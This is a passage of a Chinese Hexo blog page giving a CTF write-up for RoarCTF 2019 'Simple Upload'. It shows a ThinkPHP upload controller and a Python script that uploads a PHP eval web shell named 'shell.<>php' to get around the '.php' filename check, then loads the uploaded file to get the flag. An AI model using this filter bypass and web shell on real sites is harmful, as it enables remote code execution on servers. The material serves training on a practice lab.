class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$uploadFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$uploadFile</span>[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$upload</span> = <span class="keyword">new</span> <span class="title class_">\Think\Upload</span>();<span class="comment">// 实例化上传类</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;rootPath = <span class="string">&#x27;./Public/Uploads/&#x27;</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;savePath = <span class="string">&#x27;&#x27;</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        <span class="variable">$info</span> = <span class="variable">$upload</span>-&gt;<span class="title function_ invoke__">upload</span>() ;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$info</span>) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="variable">$upload</span>-&gt;<span class="title function_ invoke__">getError</span>());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          <span class="variable">$url</span> = __ROOT__.<span class="title function_ invoke__">substr</span>(<span class="variable">$upload</span>-&gt;rootPath,<span class="number">1</span>).<span class="variable">$info</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].<span class="variable">$info</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;<span class="variable">$url</span>,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>是一个thinkphp框架的题，文件上传路径为&#x2F;index.php&#x2F;home&#x2F;index&#x2F;upload</p>
+<p>2.可以使用脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://74f296a6-6da5-4460-b826-10a4e49e7dea.node4.buuoj.cn:81/index.php/home/index/upload/&quot;</span><br><span class="line">s = requests.Session()</span><br><span class="line">files = &#123;&quot;file&quot;: (&quot;shell.&lt;&gt;php&quot;, &quot;&lt;?php eval($_GET[&#x27;cmd&#x27;])?&gt;&quot;)&#125;</span><br><span class="line">r = requests.post(url, files=files)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>用<code>shell.&lt;&gt;php</code>绕过对<code>.php</code>的检测运行后回显<code>/Public/Uploads/2023-03-20/641865a13a180.php</code>，打开</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://74f296a6-6da5-4460-b826-10a4e49e7dea.node4.buuoj.cn:81/Public/Uploads/2023-03-20/641865a13a180.php</span><br></pre></td></tr></table></figure>
+
+<p>会直接返回flag</p>
+
+      </div>
+      
+      
+      
+    </div>
+    
+
+    
+    
+    
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#watevrCTF-2019-Pickle-Store"><span class="nav-number">1.</span> <span class="nav-text">[watevrCTF-2019]Pickle Store</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#reduce-%E6%96%B9%E6%B3%95"><span class="nav-number">1.0.1.</span> <span class="nav-text">__reduce__方法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun"><span class="nav-number">2.</span> <span class="nav-text">[CISCN2019 华北赛区 Day1 Web2]ikun</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox"><span class="nav-number">3.</span> <span class="nav-text">[CISCN2019 华北赛区 Day1 Web1]Dropbox</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RoarCTF-2019-Simple-Upload"><span class="nav-number">4.</span> <span class="nav-text">[RoarCTF 2019]Simple Upload</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Once"
+      src="/images/author.jpg">
+  <p class="site-author-name" itemprop="name">Once</p>
+  <div class="site-description" itemprop="description">forever</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1410039666&auto=0&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer">
+   <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1410039666&auto=0&height=66">
+   </iframe>
+  </div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">world</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script color='' opacity='' zIndex='' count='' src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'PZfVYAl8hrPpczg4EF7C05Rh-gzGzoHsz',
+      appKey     : 'cx8a6nD3cI8V4erQeXcAarYz',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
